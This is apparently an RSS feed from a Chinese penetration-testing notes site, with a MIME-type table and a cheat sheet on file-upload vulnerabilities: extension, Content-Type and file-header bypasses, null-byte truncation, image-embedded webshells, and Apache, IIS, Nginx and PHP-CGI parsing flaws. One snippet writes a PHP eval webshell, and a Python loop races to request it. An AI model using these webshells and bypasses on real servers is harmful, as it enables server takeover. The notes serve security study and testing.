<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Pentest Notes – </title>
    <link>https://pentestnotes.iselt.top/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
    <description>Recent content on Pentest Notes</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    
	  <atom:link href="https://pentestnotes.iselt.top/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.xml" rel="self" type="application/rss+xml" />
    
    
      
        
      
    
    
    <item>
      <title></title>
      <link>https://pentestnotes.iselt.top/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/http_content-type_%E5%AF%B9%E7%85%A7%E8%A1%A8/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://pentestnotes.iselt.top/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/http_content-type_%E5%AF%B9%E7%85%A7%E8%A1%A8/</guid>
      <description>
        
        
        &lt;h1&gt;常见Content-Type对照表&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;文件后缀&lt;/th&gt;
&lt;th&gt;Mime类型&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;.flv&lt;/td&gt;
&lt;td&gt;flv/flv-flash&lt;/td&gt;
&lt;td&gt;在线播放&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.html或.htm&lt;/td&gt;
&lt;td&gt;text/html&lt;/td&gt;
&lt;td&gt;超文本标记语言文本&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.rtf&lt;/td&gt;
&lt;td&gt;application/rtf&lt;/td&gt;
&lt;td&gt;RTF文本&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.gif 或.png&lt;/td&gt;
&lt;td&gt;image/gif(image/png)&lt;/td&gt;
&lt;td&gt;GIF图形/PNG图片&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.jpeg或.jpg&lt;/td&gt;
&lt;td&gt;image/jpeg&lt;/td&gt;
&lt;td&gt;JPEG图形&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.au&lt;/td&gt;
&lt;td&gt;audio/basic&lt;/td&gt;
&lt;td&gt;au声音文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.mid或.midi&lt;/td&gt;
&lt;td&gt;audio/midi或audio/x-midi&lt;/td&gt;
&lt;td&gt;MIDI音乐文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.ra或.ram或.rm&lt;/td&gt;
&lt;td&gt;audio/x-pn-realaudio&lt;/td&gt;
&lt;td&gt;RealAudio音乐文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.mpg或.mpeg或.mp3&lt;/td&gt;
&lt;td&gt;video/mpeg&lt;/td&gt;
&lt;td&gt;MPEG文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.avi&lt;/td&gt;
&lt;td&gt;video/x-msvideo&lt;/td&gt;
&lt;td&gt;AVI文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.gz&lt;/td&gt;
&lt;td&gt;application/x-gzip&lt;/td&gt;
&lt;td&gt;GZIP文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.tar&lt;/td&gt;
&lt;td&gt;application/x-tar&lt;/td&gt;
&lt;td&gt;TAR文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.exe&lt;/td&gt;
&lt;td&gt;application/octet-stream&lt;/td&gt;
&lt;td&gt;下载文件类型&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.rmvb&lt;/td&gt;
&lt;td&gt;video/vnd.rn-realvideo&lt;/td&gt;
&lt;td&gt;在线播放&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.txt&lt;/td&gt;
&lt;td&gt;text/plain&lt;/td&gt;
&lt;td&gt;普通文本&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.mrp&lt;/td&gt;
&lt;td&gt;application/octet-stream&lt;/td&gt;
&lt;td&gt;MRP文件（国内普遍的手机）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.ipa&lt;/td&gt;
&lt;td&gt;application/iphone-package-archive&lt;/td&gt;
&lt;td&gt;IPA文件(IPHONE)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.deb&lt;/td&gt;
&lt;td&gt;application/x-debian-package-archive&lt;/td&gt;
&lt;td&gt;DED文件(IPHONE)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.apk&lt;/td&gt;
&lt;td&gt;application/vnd.android.package-archive&lt;/td&gt;
&lt;td&gt;APK文件(安卓系统)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.cab&lt;/td&gt;
&lt;td&gt;application/vnd.cab-com-archive&lt;/td&gt;
&lt;td&gt;CAB文件(Windows Mobile)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.xap&lt;/td&gt;
&lt;td&gt;application/x-silverlight-app&lt;/td&gt;
&lt;td&gt;XAP文件(Windows Phone 7)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.sis&lt;/td&gt;
&lt;td&gt;application/vnd.symbian.install-archive&lt;/td&gt;
&lt;td&gt;SIS文件(symbian平台)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.jar&lt;/td&gt;
&lt;td&gt;application/java-archive&lt;/td&gt;
&lt;td&gt;JAR文件(JAVA平台手机通用格式)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.jad&lt;/td&gt;
&lt;td&gt;text/vnd.sun.j2me.app-descriptor&lt;/td&gt;
&lt;td&gt;JAD文件(JAVA平台手机通用格式)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.sisx&lt;/td&gt;
&lt;td&gt;application/vnd.symbian.epoc/x-sisx-app&lt;/td&gt;
&lt;td&gt;SISX文件(symbian平台)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

      </description>
    </item>
    
    <item>
      <title></title>
      <link>https://pentestnotes.iselt.top/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://pentestnotes.iselt.top/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid>
      <description>
        
        
        &lt;h1&gt;文件上传漏洞&lt;/h1&gt;&lt;p&gt;文件上传漏洞是指用户上传了一个可执行脚本文件，并通过此文件获得了执行服务器端命令的能力。在大多数情况下，文件上传漏洞一般是指上传 WEB 脚本能够被服务器解析的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够被 WEB 容器执行，其次用户能从 WEB 上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。&lt;/p&gt;
&lt;h2&gt;前端检查&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;前端检查&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#%e5%89%8d%e7%ab%af%e6%a3%80%e6%9f%a5&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;控制台重构检查函数&lt;/li&gt;
&lt;li&gt;抓包&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;文件后缀绕过&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;文件后缀绕过&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#%e6%96%87%e4%bb%b6%e5%90%8e%e7%bc%80%e7%bb%95%e8%bf%87&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;改为&lt;code&gt;php5,php4,php3,php2,phtml,pht&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;大小写绕过&lt;/li&gt;
&lt;li&gt;加空格&lt;/li&gt;
&lt;li&gt;加点&lt;/li&gt;
&lt;li&gt;加::$DATA&lt;/li&gt;
&lt;li&gt;加点+空格+点+空格（&lt;code&gt;deldot()&lt;/code&gt;删除末尾空格、&lt;code&gt;trim()&lt;/code&gt;首尾去空）&lt;/li&gt;
&lt;li&gt;双写&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;上传路径可控&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;上传路径可控&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#%e4%b8%8a%e4%bc%a0%e8%b7%af%e5%be%84%e5%8f%af%e6%8e%a7&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;上传路径+文件名拼接时，上传路径后输入保存文件名并使用 00 截断，GET：%00 截断，POST：00 截断（需要&lt;code&gt;php&lt;/code&gt;版本小于 5.3.4，&lt;code&gt;php.ini&lt;/code&gt;的&lt;code&gt;magic_quotes_gpc&lt;/code&gt;为&lt;code&gt;OFF&lt;/code&gt;状态）&lt;/p&gt;
&lt;h2&gt;Content-Type 绕过&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;content-type-绕过&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#content-type-%e7%bb%95%e8%bf%87&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;抓包修改 Content-Type&lt;/p&gt;
&lt;p&gt;见&lt;a href=&#34;HTTP_content-type_%E5%AF%B9%E7%85%A7%E8%A1%A8.md&#34; &gt;HTTP_content-type_对照表&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;文件头检测&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;文件头检测&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#%e6%96%87%e4%bb%b6%e5%a4%b4%e6%a3%80%e6%b5%8b&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;添加文件头（GIF89a 等）&lt;/p&gt;
&lt;h2&gt;文件内容检测&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;文件内容检测&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#%e6%96%87%e4%bb%b6%e5%86%85%e5%ae%b9%e6%a3%80%e6%b5%8b&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;参考&lt;a href=&#34;../PHP/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md&#34; &gt;PHP命令执行&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;二次渲染&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;二次渲染&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;测试图片的渲染后没有修改的位置，将一句话木马添加进去，这样就可以利用文件包含去执行 php 一句话木马了&lt;/p&gt;
&lt;p&gt;对于 GIF 的上传，只需要判断没有修改的位置，然后将 php 一句话木马添加即可&lt;/p&gt;
&lt;p&gt;对于 PNG 的上传，需要修改 PLTE 数据块或者修改 IDAT 数据块&lt;/p&gt;
&lt;p&gt;详见 &lt;a href=&#34;https://blog.csdn.net/weixin_45519736/article/details/105775721&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;制作绕过二次渲染的图片马&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;条件竞争&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;条件竞争&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#%e6%9d%a1%e4%bb%b6%e7%ab%9e%e4%ba%89&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;针对上传后检测再删除的情况，可用传一个创建一个一句话木马的文件，然后不断访问，直到执行成功。&lt;/p&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
  

&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// upload
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; $file&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fopen&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;muma.php&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; $string&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;?php @eval($_POST[&amp;#34;test&amp;#34;]); ?&amp;gt;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fwrite&lt;/span&gt;($file,$string);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fcolse&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;

  
&lt;/div&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
  

&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# run&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1000000&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    url&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xxx&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status_code &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; :
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;yse&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;

  
&lt;/div&gt;
&lt;h2&gt;解析漏洞&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;解析漏洞&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#%e8%a7%a3%e6%9e%90%e6%bc%8f%e6%b4%9e&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Apache 解析漏洞&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;apache-解析漏洞&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#apache-%e8%a7%a3%e6%9e%90%e6%bc%8f%e6%b4%9e&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;在Apache1.x和2.x版本中，Apache可以识别多个文件扩展名。如果文件存在多个扩展名，Apache会从后向前开始解析，如果遇到Apache配置文件中的mime.types没有定义的扩展名，就继续向前解析，直到识别出可以解析的扩展名；如果所有扩展名都无法解析，就会以DeafultType的默认值text/plain将该文件当作文本解析。&lt;/p&gt;
&lt;p&gt;例如：&lt;code&gt;file.php.en&lt;/code&gt;, &lt;code&gt;file.php.rar&lt;/code&gt;, &lt;code&gt;file.php.gif&lt;/code&gt;当作PHP文件来解析&lt;/p&gt;
&lt;h3&gt;ISS 解析漏洞&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;iss-解析漏洞&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#iss-%e8%a7%a3%e6%9e%90%e6%bc%8f%e6%b4%9e&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;IIS6.0在处理有分号&lt;code&gt;;&lt;/code&gt;的文件名时，会截断分号后面的部分，造成解析漏洞。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;例如：&lt;code&gt;test.asp;.jpg&lt;/code&gt;会被当成ASP文件来解析&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;IIS6.0目录解析漏洞：当目录的名称是&lt;code&gt;.asp&lt;/code&gt;、&lt;code&gt;.asa&lt;/code&gt;、&lt;code&gt;.cer&lt;/code&gt;和&lt;code&gt;.cdx&lt;/code&gt;时，IIS6.0会将目录里任何扩展名的文件都当作ASP文件来执行，造成目录解析漏洞。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Nginx 解析漏洞&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;nginx-解析漏洞&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#nginx-%e8%a7%a3%e6%9e%90%e6%bc%8f%e6%b4%9e&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;nginx(0.5.x, 0.6.x, 0.7 &amp;lt;= 0.7.65, 0.8 &amp;lt;= 0.8.37)空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）&lt;/p&gt;
&lt;h3&gt;PHP CGI 解析漏洞&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;php-cgi-解析漏洞&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#php-cgi-%e8%a7%a3%e6%9e%90%e6%bc%8f%e6%b4%9e&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;PHP的配置文件中有一个参数时cgi.fix_pathinfo，如果设置了cgi.fix_pathinfo=1,则在访问&lt;code&gt;http://www.a.com/path/test.jpg/notexist.php&lt;/code&gt;时，PHP会递归向前解析，如果test.jpg存在，就会把test.jpg当作PHP文件解析，IIS7.x和Nginx中间件解析PHP文件时，默认PHP的配置文件都开启了cgi.fix_pathinfo，导致产生解析漏洞。此时 Nginx 的配置如下&lt;/p&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
  

&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;location&lt;/span&gt; ~ &lt;span style=&#34;color:#e6db74&#34;&gt;\.php$&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;root&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;html&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;fastcgi_pass&lt;/span&gt; 127.0.0.1:&lt;span style=&#34;color:#ae81ff&#34;&gt;9000&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;fastcgi_index&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;index.php&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;fastcgi_param&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;SCRIPT_FILENAME&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/scripts&lt;/span&gt;$fastcgi_script_name;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;fastcgi_param&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;

  
&lt;/div&gt;

      </description>
    </item>
    
  </channel>
</rss>
